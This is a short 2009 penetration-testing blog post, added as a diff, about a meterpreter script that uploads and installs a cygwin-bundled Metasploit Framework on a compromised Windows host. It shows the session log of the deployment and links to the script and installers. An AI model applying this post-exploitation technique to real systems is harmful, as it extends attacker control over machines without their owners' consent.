@@ -1,0 +1,68 @@
+---
+author: mubix
+comments: true
+date: 2009-06-26 05:45:08+00:00
+layout: post
+title: Metasploit Framework as a Payload
+categories:
+- metasploit
+- meterpreter
+---
+
+Well, sorta…  
+  
+I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.  
+  
+_Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right._  
+  
+You can download the script here: [https://github.com/mubix/stuff/blob/master/metasploit/deploymsf.rb](https://github.com/mubix/stuff/blob/master/metasploit/deploymsf.rb)  
+  
+You can download the cygwin installs from the metasploit website:  
+  
+* 13mb FULL framework: [framework-3.3-dev.exe](https://github.com/mubix/stuff/blob/master/w32bins/metasploit_installers/framework-3.3-dev.exe?raw=true)
+* 5mb MINI (just msfconsole): [mini-3.3-dev.exe](https://github.com/mubix/stuff/blob/master/w32bins/metasploit_installers/mini-3.3-dev.exe?raw=true)
+
+And here is what it looks like:
+
+```
+meterpreter > run deploymsf -f framework-3.3-dev.exe  
+[*] Running Meterpreter MSFp Deploytment Script.....  
+[*] Uploading MSFp for for deployment....  
+[*] MSFp uploaded as C:DOCUME~1mubixLOCALS~1Temp12681.exe  
+[*] Installing MSFp...........  
+[*] Done!  
+[*] Installation Complete!  
+[*] Running cygwin shell channelized...  
+[*] Channel 18 created - Type: interact 18 to play  
+[*] Be warned, it takes a bit for post setup to happen  
+[*] and you will not see a prompt, try pwd to check  
+meterpreter > interact 18  
+Interacting with channel 18...  
+  
+[*] Configuring multi-user permissions for first run...  
+[*] Configuring the initial user environment...  
+pwd  
+/home/mubix  
+ls  
+msfconsole  
+*** Metasploit only has EXPERIMENTAL support for Ruby 1.9.1 and newer, things may break!  
+*** Please report bugs to msfdev[at]metasploit.com  
+[-] ***  
+[-] * WARNING: No database support: LoadError no such file to load -- active_record  
+[-] ***  
+  
+## ### ## ##  
+## ## #### ###### #### ##### ##### ## #### ######  
+####### ## ## ## ## ## ## ## ## ## ## ### ##  
+####### ###### ## ##### #### ## ## ## ## ## ## ##  
+## # ## ## ## ## ## ## ##### ## ## ## ## ##  
+## ## #### ### ##### ##### ## #### #### #### ###  
+##  
+  
+=[ msf v3.3-dev  
++ -- --=[ 379 exploits - 231 payloads  
++ -- --=[ 20 encoders - 7 nops  
+=[ 156 aux  
+  
+msf >GAME OVER
+```
